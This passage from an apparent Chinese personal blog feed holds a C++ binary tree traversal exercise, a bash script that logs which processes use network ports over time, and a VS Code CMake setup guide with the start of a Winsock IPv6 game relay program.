class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TreeNode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data;</span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="type">int</span> x) : <span class="built_in">data</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) ,<span class="built_in">flag</span>(<span class="literal">false</span>)&#123;&#125;</span><br><span class="line">&#125;bt;</span><br><span class="line"><span class="comment">//前中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(bt* p)</span></span>&#123;</span><br><span class="line">    bt *stick[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">short</span> top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (top &gt; <span class="number">0</span> || p != <span class="literal">NULL</span>) &#123;<span class="comment">//有top三次为0，第1,2次p为根节点</span></span><br><span class="line">        <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            std::cout &lt;&lt; p-&gt;data;</span><br><span class="line">            stick[top++] = p;</span><br><span class="line">            p = p-&gt;left;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p = stick[--top];</span><br><span class="line">            <span class="comment">//中序//std::cout &lt;&lt; p-&gt;data;</span></span><br><span class="line">            p = p-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(bt *p)</span></span>&#123;</span><br><span class="line">    bt *stick[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">short</span> top = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (top &gt; <span class="number">1</span> || p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>&amp;&amp;p!=stick[top])</span><br><span class="line">        &#123;</span><br><span class="line">            stick[++top] = p;</span><br><span class="line">            p = p-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!flag[top])</span><br><span class="line">        &#123;</span><br><span class="line">            p = stick[top]; <span class="comment">// top指向值的后一位，这个stick[top]去右边</span></span><br><span class="line">            flag[top] = <span class="literal">true</span>; <span class="comment">// 记录stick[top]去右边</span></span><br><span class="line">            p = p-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p = stick[top];</span><br><span class="line">            std::cout &lt;&lt; p-&gt;data;</span><br><span class="line">            flag[top] = <span class="literal">false</span>;<span class="comment">//出栈同步恢复flag</span></span><br><span class="line">            top--;</span><br><span class="line">            p = stick[top];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">bt *<span class="title">creat</span><span class="params">()</span></span>&#123;<span class="comment">//前序</span></span><br><span class="line">    <span class="type">char</span> d;</span><br><span class="line">    std::cin &gt;&gt; d;</span><br><span class="line">    <span class="keyword">if</span>(d==<span class="string">&#x27;#&#x27;</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    bt *p;</span><br><span class="line">    p = <span class="keyword">new</span> <span class="built_in">bt</span>(d);</span><br><span class="line">    p-&gt;left = <span class="built_in">creat</span>();</span><br><span class="line">    p-&gt;right = <span class="built_in">creat</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span>, <span class="type">char</span> **)</span></span>&#123;</span><br><span class="line">    <span class="comment">//ABFI####CD##E##</span></span><br><span class="line">    bt *root = <span class="built_in">creat</span>();</span><br><span class="line">    <span class="built_in">fun</span>(root);</span><br><span class="line">    <span class="built_in">func</span>(root);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 乱分的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>端口被进程使用记录</title>
      <link href="/2024/11/08/%E5%B7%A5%E5%85%B7/%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%AB%AF%E5%8F%A3%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/11/08/%E5%B7%A5%E5%85%B7/%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%AB%AF%E5%8F%A3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>抓包发现建立了奇奇怪怪链接，但是不知道是那个进程发起的就很难受<br>暂时好像没什么用的脚本<br>记录端口被哪些进程占用<br>和进程占用端口的时间段<br> <span id="more"></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pts=$(lsof -i)</span><br><span class="line">pts=<span class="variable">$&#123;pts// /.&#125;</span></span><br><span class="line">rst=(<span class="variable">$&#123;pts//</span></span><br><span class="line"><span class="variable">/ &#125;</span>)</span><br><span class="line"><span class="built_in">declare</span> -A buff</span><br><span class="line"><span class="keyword">for</span> ir <span class="keyword">in</span> <span class="variable">$&#123;rst[@]&#125;</span>;<span class="keyword">do</span></span><br><span class="line">    buff[<span class="variable">$ir</span>]=$(<span class="built_in">date</span> +<span class="string">&quot;%H:%M:%S.%N&quot;</span>)</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">unset</span> rst   </span><br><span class="line">    pts=$(lsof -i)</span><br><span class="line">    pts=<span class="variable">$&#123;pts// /.&#125;</span></span><br><span class="line">    rst=(<span class="variable">$&#123;pts//</span></span><br><span class="line"><span class="variable">    / &#125;</span>)</span><br><span class="line">    <span class="keyword">for</span> bar <span class="keyword">in</span> <span class="variable">$&#123;!buff[@]&#125;</span>;<span class="keyword">do</span></span><br><span class="line">        f=1</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$&#123;!rst[@]&#125;</span>;<span class="keyword">do</span></span><br><span class="line">        <span class="comment">#[]与变量间必须加空格</span></span><br><span class="line">            <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$bar</span>&quot;</span> = <span class="string">&quot;<span class="variable">$&#123;rst[$i]&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                <span class="comment">#bash的数组像键值对，删除后不会往前补位</span></span><br><span class="line">                <span class="built_in">unset</span> rst[<span class="variable">$i</span>]</span><br><span class="line">                <span class="comment">#赋值不能加空格</span></span><br><span class="line">                f=0</span><br><span class="line">                <span class="built_in">break</span> 1</span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$f</span> -eq 1 ];<span class="keyword">then</span></span><br><span class="line">            tmp=<span class="variable">$bar</span><span class="string">&#x27;_|||_&#x27;</span><span class="variable">$&#123;buff[$bar]&#125;</span><span class="string">&#x27;=&gt;&#x27;</span>$(<span class="built_in">date</span> +<span class="string">&quot;%H:%M:%S.%N&quot;</span>)</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$tmp</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$tmp</span> &gt;&gt;lsoflog.log 2&gt;&amp;1;</span><br><span class="line">            <span class="built_in">unset</span> buff[<span class="variable">$bar</span>]</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">for</span> ir <span class="keyword">in</span> <span class="variable">$&#123;rst[@]&#125;</span>;<span class="keyword">do</span></span><br><span class="line">        buff[<span class="variable">$ir</span>]=$(<span class="built_in">date</span> +<span class="string">&quot;%H:%M:%S.%N&quot;</span>)</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">sleep</span> 0.3;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 乱分的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bash </tag>
            
            <tag> 初见 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode配置cmake环境</title>
      <link href="/2024/11/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/cmke_vsc_ipv6%E8%81%94%E6%9C%BA%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%B5%8B%E8%AF%95%E7%89%88/"/>
      <url>/2024/11/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/cmke_vsc_ipv6%E8%81%94%E6%9C%BA%E5%B7%A5%E5%85%B7%EF%BC%8C%E6%B5%8B%E8%AF%95%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>环境<br> <span id="more"></span></p><h3 id="vscode配置cmake环境"><a href="#vscode配置cmake环境" class="headerlink" title="vscode配置cmake环境"></a>vscode配置cmake环境</h3><details><summary><font color='greenyellow' font-size='large'>环境(展开)</font></summary><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p> <del>下载clion24.1.3,用7zip打开clion安装包，取出bin&#x2F;mingw64</del><br><del>只有这里的mingw才含有inet_pton()函数</del></p><ul><li><p>下载mingw64</p><blockquote><p><a href="https://github.com/niXman/mingw-builds-binaries/releases">下载地址</a><br>下载x86_64-14.2.0-release-posix-seh-ucrt-rt_v12-rev0.7z</p></blockquote></li><li><p>下载cmake <a href="https://cmake.org/download/">下载地址</a></p></li></ul><hr><ul><li>环境变量-系统变量-path下添加绝对路经 &#x2F;mingw64&#x2F;bin &#x2F;cmake&#x2F;bin</li><li>vscode打开cpp文件，根据提示安装插件</li><li>Code打开空文件夹<br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ipv6connecttool/1.jpg" alt="试试图片" loading="lazy"></li><li>命令面板cmake quick start<br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ipv6connecttool/2.jpg" alt="试试图片" loading="lazy"><br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ipv6connecttool/3.jpg" alt="试试图片" loading="lazy"></li></ul><ul><li>输入项目名称</li><li>创建可执行文件</li><li>不勾选支持</li><li>选择添加新预设，从编译器创建<em>一定要为预设添加名字</em><br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ipv6connecttool/4.jpg" alt="试试图片" loading="lazy"></li></ul><ul><li>不能F5执行，点终端下面(最底部)的生成 或debug<br><img src="/images/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ipv6connecttool/5.jpg" alt="试试图片" loading="lazy"></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.5</span>.<span class="number">0</span>)</span><br><span class="line"><span class="keyword">project</span>(asocket)<span class="comment">#项目名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>(CMAKE_CXX_STANDARD <span class="number">17</span>)</span><br><span class="line"><span class="keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="string">&quot;-static-libgcc -static-libstdc++&quot;</span>)</span><br><span class="line"><span class="keyword">link_libraries</span>(ws2_32)</span><br><span class="line"><span class="keyword">add_executable</span>(asocket main.cpp)</span><br></pre></td></tr></table></figure></details><h3 id="测试用"><a href="#测试用" class="headerlink" title="测试用"></a>测试用</h3><details><summary><font color='greenyellow'>测试用(展开)</font></summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="comment">//#include&lt;mutex&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;mswsock.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">INITSOCKET</span><span class="params">(SOCKET*,SOCKADDR_IN*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">INITSOCKETwai</span><span class="params">(SOCKET*, SOCKADDR_IN6*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> dataj[<span class="number">2048</span>]&#123;&#125;;</span><br><span class="line"><span class="type">int</span> bufsize=<span class="keyword">sizeof</span>(dataj);</span><br><span class="line"><span class="type">char</span> dataw[<span class="number">2048</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun_para</span>&#123;</span></span><br><span class="line">        SOCKET * dstSockjb;</span><br><span class="line">        SOCKET * waiSockjb;</span><br><span class="line">        SOCKADDR_IN * dstAddrjb&#123;&#125;;</span><br><span class="line">        SOCKADDR_IN6 * waiAddrjb&#123;&#125;;</span><br><span class="line">        SOCKADDR_IN * getjhaddr&#123;&#125;;</span><br><span class="line">        SOCKADDR_IN6 * getwaiaddr&#123;&#125;;</span><br><span class="line">        <span class="type">char</span> * datajb;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">j2pf</span><span class="params">(fun_para*)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">p2jf</span><span class="params">(fun_para*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dstport,waiport,conn,serport,limport;</span><br><span class="line"><span class="type">char</span> ip[<span class="number">128</span>];</span><br><span class="line"><span class="type">bool</span> soc;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    WSADATA wsaData&#123;&#125;;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>),&amp;wsaData);</span><br><span class="line">    SOCKET dstSock,waiSock;</span><br><span class="line">    SOCKADDR_IN dstAddr&#123;&#125;,getjhaddr&#123;&#125;;</span><br><span class="line">    SOCKADDR_IN6 getwaiaddr&#123;&#125;,waiAddr&#123;&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;getwaiaddr,<span class="number">0</span>,<span class="keyword">sizeof</span>(SOCKADDR_IN6));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;waiAddr,<span class="number">0</span>,<span class="keyword">sizeof</span>(SOCKADDR_IN6));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ser(1),cli(0): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;soc;</span><br><span class="line">    <span class="keyword">if</span>(soc) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;主世界端口: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;dstport;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;对外ip地址: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;ip;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;对外ip端口: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;waiport;</span><br><span class="line">        conn=<span class="number">55094</span>;<span class="comment">//52019;//随便</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;限制端口: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;limport;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;服务器ip地址: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;ip;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;ip;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;服务器端口: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;serport;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;限制端口: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;waiport;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;联机端口,接受游戏数据&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;conn;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;c_connect(&quot;</span>&lt;&lt;<span class="string">&quot;127.0.0.1,&quot;</span>&lt;&lt;conn&lt;&lt;<span class="string">&quot;)\n&quot;</span>;</span><br><span class="line">        <span class="comment">//waiport=50302;//连接(服务器端口)的本地端口调试使用55095</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">////////////////地址</span></span><br><span class="line">    <span class="keyword">if</span>(soc) &#123;</span><br><span class="line">        getjhaddr.sin_family=AF_INET;</span><br><span class="line">        getjhaddr.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>); <span class="comment">//inet_addr(&quot;127.0.0.1&quot;);;//0:0:0:0</span></span><br><span class="line">        getjhaddr.sin_port = htons(dstport);<span class="comment">//主世界端口</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //sockaddr_in RecvAddr;</span></span><br><span class="line"><span class="comment">    //RecvAddr.sin_family = AF_INET;</span></span><br><span class="line"><span class="comment">    //RecvAddr.sin_port = htons(10998);</span></span><br><span class="line"><span class="comment">    //RecvAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        getwaiaddr.sin6_family=AF_INET6;</span><br><span class="line">        inet_pton(AF_INET6, ip, &amp;getwaiaddr.sin6_addr);</span><br><span class="line">        getwaiaddr.sin6_port=htons(serport);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/////////////build socket</span></span><br><span class="line">    dstAddr.sin_family = AF_INET;</span><br><span class="line">    dstAddr.sin_addr.S_un.S_addr=inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);<span class="comment">//0:0:0:0</span></span><br><span class="line">    dstAddr.sin_port=htons(conn);<span class="comment">//s无所谓对接10999 c：c_connect端口</span></span><br><span class="line">    INITSOCKET(&amp;dstSock,&amp;dstAddr);</span><br><span class="line"></span><br><span class="line">    waiAddr.sin6_family=AF_INET6;</span><br><span class="line">    waiAddr.sin6_port=htons(waiport);<span class="comment">//s对外端口 /c限制端口</span></span><br><span class="line">    <span class="keyword">if</span>(soc) &#123;</span><br><span class="line">        inet_pton(AF_INET6, ip, &amp;waiAddr.sin6_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        